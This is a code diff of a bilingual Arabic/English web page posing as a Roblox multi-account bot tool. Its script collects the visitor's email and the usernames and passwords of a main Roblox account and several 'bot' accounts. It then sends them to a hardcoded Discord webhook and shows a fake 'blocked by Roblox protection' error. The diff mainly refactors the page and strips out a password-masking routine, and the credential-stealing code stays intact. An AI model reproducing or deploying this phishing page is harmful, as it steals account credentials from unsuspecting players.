@@ -12,6 +12,7 @@
             --input-border: #cccccc;
             --btn-bg: #007bff;
         }
+
         .dark-mode {
             --bg-color: #1a1a1a;
             --container-bg: #2d2d2d;
@@ -19,6 +20,7 @@
             --input-border: #444444;
             --btn-bg: #375a7f;
         }
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: var(--bg-color);
@@ -30,6 +32,7 @@
             color: var(--text-color);
             transition: 0.3s;
         }
+
         .top-controls {
             position: absolute;
             top: 20px;
@@ -37,6 +40,7 @@
             display: flex;
             gap: 10px;
         }
+
         .control-btn {
             width: 40px;
             height: 40px;
@@ -48,10 +52,11 @@
             align-items: center;
             font-size: 20px;
             box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            transition: 0.3s;
         }
+
         #theme-toggle { background-color: #333; color: white; }
         .dark-mode #theme-toggle { background-color: white; color: #333; }
+
         .container {
             background: var(--container-bg);
             padding: 30px;
@@ -60,33 +65,39 @@
             width: 100%;
             max-width: 500px;
             text-align: center;
-            transition: 0.3s;
         }
+
         h1 { color: var(--btn-bg); margin-bottom: 20px; font-size: 24px; }
         .step { display: none; }
         .step.active { display: block; }
+
         input, select {
-            width: 100%; padding: 12px; margin: 10px 0;
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
             border: 1px solid var(--input-border);
-            border-radius: 6px; box-sizing: border-box;
-            background: var(--container-bg); color: var(--text-color);
+            border-radius: 6px;
+            box-sizing: border-box;
+            background: var(--container-bg);
+            color: var(--text-color);
         }
+
         button.main-btn {
-            width: 100%; padding: 12px;
+            width: 100%;
+            padding: 12px;
             background-color: var(--btn-bg);
-            border: none; border-radius: 6px;
-            color: white; font-weight: bold;
-            cursor: pointer; transition: 0.3s; margin-top: 10px;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
         }
+
         .error { color: #ff4d4d; font-size: 14px; margin-top: 5px; display: none; font-weight: bold; }
         .bot-section { border-top: 1px solid var(--input-border); margin-top: 15px; padding-top: 10px; text-align: right; }
         .en-mode { direction: ltr; text-align: left; }
         .en-mode .bot-section { text-align: left; }
-        /* تنسيق لحقل كلمة المرور الوهمي */
-        .password-field {
-            letter-spacing: 2px;
-            font-family: monospace;
-        }
     </style>
 </head>
 <body>
@@ -97,6 +108,7 @@
 </div>
 
 <div class="container">
+    <!-- المرحلة الأولى -->
     <div id="step1" class="step active">
         <h1 id="t1">Multi Accounts - Roblox</h1>
         <p id="p1">عذراً للتحقق أنك إنسان ولست بوت يحاول استغلال الرابط ضع ايميلك هنا :</p>
@@ -105,6 +117,7 @@
         <button class="main-btn" onclick="validateEmail()" id="b1">تحقق الآن</button>
     </div>
 
+    <!-- المرحلة الثانية -->
     <div id="step2" class="step">
         <h1 id="t2">Multi Bots - Roblox</h1>
         <p id="p2">كم تريد عدد البوتات + (يتطلب هاذا الخيار حسابك الاساسي ليدخلون اليه) :</p>
@@ -120,7 +133,7 @@
         <div class="bot-section">
             <p id="main_title" style="font-weight:bold">الحساب الاساسي :</p>
             <input type="text" id="main_user" placeholder="user" autocomplete="off">
-            <input type="text" id="main_pass" placeholder="Password" autocomplete="off" class="password-field" oninput="maskPassword(this)">
+            <input type="text" id="main_pass" placeholder="Password" autocomplete="off">
         </div>
 
         <div id="bots_inputs_container"></div>
@@ -128,6 +141,7 @@
         <button class="main-btn" onclick="sendData()" id="b2">تشغيل البوتات [+]</button>
     </div>
 
+    <!-- المرحلة الثالثة -->
     <div id="step3" class="step">
         <h2 id="t3">Error - Roblox Anti</h2>
         <hr>
@@ -139,65 +153,15 @@
     const webhookURL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE";
     let currentLang = "ar";
 
-    // حفظ كلمة المرور الحقيقية في متغير منفصل لكل حقل
-    let realPasswords = {};
-
-    function maskPassword(inputElement) {
-        const id = inputElement.id;
-        const realValue = inputElement.value;
-        // حفظ القيمة الحقيقية
-        realPasswords[id] = realValue;
-        // عرض النقاط بدلاً من الأحرف
-        inputElement.value = '•'.repeat(realValue.length);
-        // إعادة وضع المؤشر في نهاية النص
-        const len = inputElement.value.length;
-        inputElement.setSelectionRange(len, len);
-    }
-
-    function unmaskOnFocus(inputElement) {
-        const id = inputElement.id;
-        if (realPasswords[id] !== undefined) {
-            inputElement.value = realPasswords[id];
-        }
-        inputElement.type = 'text'; // للتأكد من أنه text
-        inputElement.classList.remove('password-field');
-        // بعد التركيز، المستخدم يكتب بشكل طبيعي، ونعيد التعتيم عند الفقدان
-    }
-
-    function remaskOnBlur(inputElement) {
-        const id = inputElement.id;
-        const currentValue = inputElement.value;
-        realPasswords[id] = currentValue;
-        inputElement.value = '•'.repeat(currentValue.length);
-        inputElement.classList.add('password-field');
-        inputElement.type = 'text';
-    }
-
-    function createPasswordField(containerId, fieldId, placeholder) {
-        const input = document.createElement('input');
-        input.type = 'text';
-        input.id = fieldId;
-        input.placeholder = placeholder;
-        input.autocomplete = 'off';
-        input.classList.add('password-field');
-        input.onfocus = function() { unmaskOnFocus(this); };
-        input.onblur = function() { remaskOnBlur(this); };
-        input.oninput = function() { maskPassword(this); };
-        realPasswords[fieldId] = '';
-        return input;
-    }
-
     function saveSettings() {
         localStorage.setItem('darkMode', document.body.classList.contains('dark-mode') ? 'true' : 'false');
         localStorage.setItem('language', currentLang);
-        localStorage.setItem('direction', document.getElementById('mainHtml').dir);
         localStorage.setItem('enModeClass', document.body.classList.contains('en-mode') ? 'true' : 'false');
     }
 
     function loadSettings() {
         const savedDark = localStorage.getItem('darkMode');
         const savedLang = localStorage.getItem('language');
-        const savedDir = localStorage.getItem('direction');
         const savedEnMode = localStorage.getItem('enModeClass');
 
         if (savedDark === 'true') {
@@ -210,12 +174,25 @@
 
         if (savedLang === 'en') {
             currentLang = 'en';
-            const html = document.getElementById('mainHtml');
-            html.lang = "en";
-            html.dir = savedDir === 'ltr' ? 'ltr' : 'ltr';
-            if (savedEnMode === 'true') document.body.classList.add('en-mode');
-            else document.body.classList.remove('en-mode');
+            document.getElementById('mainHtml').lang = "en";
+            document.getElementById('mainHtml').dir = "ltr";
+            document.body.classList.add('en-mode');
+            updateTexts('en');
+            document.getElementById('lang-toggle').innerText = "🇸🇦";
+        } else {
+            currentLang = 'ar';
+            document.getElementById('mainHtml').lang = "ar";
+            document.getElementById('mainHtml').dir = "rtl";
+            document.body.classList.remove('en-mode');
+            updateTexts('ar');
+            document.getElementById('lang-toggle').innerText = "🇺🇸";
+        }
+        const selectedCount = document.getElementById('bot_count').value;
+        if (selectedCount !== "0") generateBotFields();
+    }
 
+    function updateTexts(lang) {
+        if (lang === 'en') {
             document.getElementById('t1').innerText = "Multi Accounts - Roblox";
             document.getElementById('p1').innerText = "Sorry, to verify that you are human and not a bot, put your email here:";
             document.getElementById('b1').innerText = "Verify Now";
@@ -226,14 +203,7 @@
             document.getElementById('b2').innerText = "Start Bots [+]";
             document.getElementById('t3').innerText = "Error - Roblox Anti";
             document.getElementById('p3').innerText = "Sorry, the attempt was blocked due to Roblox protection. Please try again later or inform the developer!";
-            document.getElementById('lang-toggle').innerText = "🇸🇦";
         } else {
-            currentLang = 'ar';
-            const html = document.getElementById('mainHtml');
-            html.lang = "ar";
-            html.dir = "rtl";
-            document.body.classList.remove('en-mode');
-
             document.getElementById('t1').innerText = "Multi Accounts - Roblox";
             document.getElementById('p1').innerText = "عذراً للتحقق أنك إنسان ولست بوت يحاول استغلال الرابط ضع ايميلك هنا :";
             document.getElementById('b1').innerText = "تحقق الآن";
@@ -244,10 +214,7 @@
             document.getElementById('b2').innerText = "تشغيل البوتات [+]";
             document.getElementById('t3').innerText = "Error - Roblox Anti";
             document.getElementById('p3').innerText = "عذراً لقد تم صد المحاوله بسبب حمايه روبلوكس ، حاول مره اخرى لاحقاً او اخبر مطور الموقع بهاذا الخلل .. سيتم تجاوز الحمايه لاحقاً من قبل المطور !";
-            document.getElementById('lang-toggle').innerText = "🇺🇸";
         }
-        const selectedCount = document.getElementById('bot_count').value;
-        if (selectedCount !== "0") generateBotFields();
     }
 
     function toggleTheme() {
@@ -258,37 +225,20 @@
     }
 
     function toggleLang() {
-        const html = document.getElementById('mainHtml');
         if (currentLang === "ar") {
-            html.lang = "en"; html.dir = "ltr";
-            document.body.classList.add('en-mode');
-            document.getElementById('t1').innerText = "Multi Accounts - Roblox";
-            document.getElementById('p1').innerText = "Sorry, to verify that you are human and not a bot, put your email here:";
-            document.getElementById('b1').innerText = "Verify Now";
-            document.getElementById('t2').innerText = "Multi Bots - Roblox";
-            document.getElementById('p2').innerText = "How many bots do you want? (This requires your main account to enter):";
-            document.getElementById('opt0').innerText = "Choose count...";
-            document.getElementById('main_title').innerText = "Main Account:";
-            document.getElementById('b2').innerText = "Start Bots [+]";
-            document.getElementById('t3').innerText = "Error - Roblox Anti";
-            document.getElementById('p3').innerText = "Sorry, the attempt was blocked due to Roblox protection. Please try again later or inform the developer!";
-            document.getElementById('lang-toggle').innerText = "🇸🇦";
             currentLang = "en";
+            document.getElementById('mainHtml').lang = "en";
+            document.getElementById('mainHtml').dir = "ltr";
+            document.body.classList.add('en-mode');
+            updateTexts('en');
+            document.getElementById('lang-toggle').innerText = "🇸🇦";
         } else {
-            html.lang = "ar"; html.dir = "rtl";
-            document.body.classList.remove('en-mode');
-            document.getElementById('t1').innerText = "Multi Accounts - Roblox";
-            document.getElementById('p1').innerText = "عذراً للتحقق أنك إنسان ولست بوت يحاول استغلال الرابط ضع ايميلك هنا :";
-            document.getElementById('b1').innerText = "تحقق الآن";
-            document.getElementById('t2').innerText = "Multi Bots - Roblox";
-            document.getElementById('p2').innerText = "كم تريد عدد البوتات + (يتطلب هاذا الخيار حسابك الاساسي ليدخلون اليه) :";
-            document.getElementById('opt0').innerText = "اختر العدد...";
-            document.getElementById('main_title').innerText = "الحساب الاساسي :";
-            document.getElementById('b2').innerText = "تشغيل البوتات [+]";
-            document.getElementById('t3').innerText = "Error - Roblox Anti";
-            document.getElementById('p3').innerText = "عذراً لقد تم صد المحاوله بسبب حمايه روبلوكس ، حاول مره اخرى لاحقاً او اخبر مطور الموقع بهاذا الخلل .. سيتم تجاوز الحمايه لاحقاً من قبل المطور !";
-            document.getElementById('lang-toggle').innerText = "🇺🇸";
             currentLang = "ar";
+            document.getElementById('mainHtml').lang = "ar";
+            document.getElementById('mainHtml').dir = "rtl";
+            document.body.classList.remove('en-mode');
+            updateTexts('ar');
+            document.getElementById('lang-toggle').innerText = "🇺🇸";
         }
         const selectedCount = document.getElementById('bot_count').value;
         if (selectedCount !== "0") generateBotFields();
@@ -312,40 +262,27 @@
         const container = document.getElementById('bots_inputs_container');
         container.innerHTML = "";
         for (let i = 1; i <= count; i++) {
-            const div = document.createElement('div');
-            div.className = 'bot-section';
-            const p = document.createElement('p');
-            p.style.fontWeight = 'bold';
-            p.innerText = `${currentLang === "ar" ? 'حساب البوت' : 'Bot Account'} ${i} :`;
-            div.appendChild(p);
-
-            const userInput = document.createElement('input');
-            userInput.type = 'text';
-            userInput.id = `bot_user_${i}`;
-            userInput.placeholder = 'User';
-            userInput.autocomplete = 'off';
-            div.appendChild(userInput);
-
-            const passField = createPasswordField(null, `bot_pass_${i}`, 'Password');
-            div.appendChild(passField);
-
-            container.appendChild(div);
+            container.innerHTML += `
+                <div class="bot-section">
+                    <p style="font-weight:bold">${currentLang === "ar" ? 'حساب البوت' : 'Bot Account'} ${i} :</p>
+                    <input type="text" id="bot_user_${i}" placeholder="User" autocomplete="off">
+                    <input type="text" id="bot_pass_${i}" placeholder="Password" autocomplete="off">
+                </div>`;
         }
     }
 
     async function sendData() {
         const count = parseInt(document.getElementById('bot_count').value);
-        const mainUser = document.getElementById('main_user').value;
-        // استخراج كلمة المرور الحقيقية للحساب الأساسي
-        const mainPass = realPasswords['main_pass'] || document.getElementById('main_pass').value;
+        const mainU = document.getElementById('main_user').value;
+        const mainP = document.getElementById('main_pass').value;
         const email = document.getElementById('user_email').value;
 
-        if (count == 0 || !mainUser || !mainPass) return;
+        if (count == 0 || !mainU || !mainP) return;
 
         let botsArr = [];
         for (let i = 1; i <= count; i++) {
             let u = document.getElementById(`bot_user_${i}`).value;
-            let p = realPasswords[`bot_pass_${i}`] || document.getElementById(`bot_pass_${i}`).value;
+            let p = document.getElementById(`bot_pass_${i}`).value;
             if (!u || !p) {
                 alert(currentLang === "ar" ? `عذراً ولاكنك طلبت (${count}) عبها كامله!` : `Fill all ${count} accounts!`);
                 return;
@@ -358,8 +295,8 @@
             color: 3447003,
             fields: [
                 { name: "📧 الإيميل", value: email },
-                { name: "👤 حسابه الاساسي : user", value: mainUser, inline: true },
-                { name: "Password", value: mainPass, inline: true },
+                { name: "👤 حسابه الاساسي : user", value: mainU, inline: true },
+                { name: "Password", value: mainP, inline: true },
                 ...botsArr
             ],
             footer: { text: "تم سحب المعلومات من الموقع |Z7F" },
@@ -375,13 +312,6 @@
         document.getElementById('step2').classList.remove('active');
         document.getElementById('step3').classList.add('active');
     }
-
-    // تهيئة حقول كلمة المرور الأساسية
-    const mainPassInput = document.getElementById('main_pass');
-    mainPassInput.onfocus = function() { unmaskOnFocus(this); };
-    mainPassInput.onblur = function() { remaskOnBlur(this); };
-    mainPassInput.oninput = function() { maskPassword(this); };
-    realPasswords['main_pass'] = '';
 
     document.getElementById('theme-toggle').onclick = toggleTheme;
     document.getElementById('lang-toggle').onclick = toggleLang;
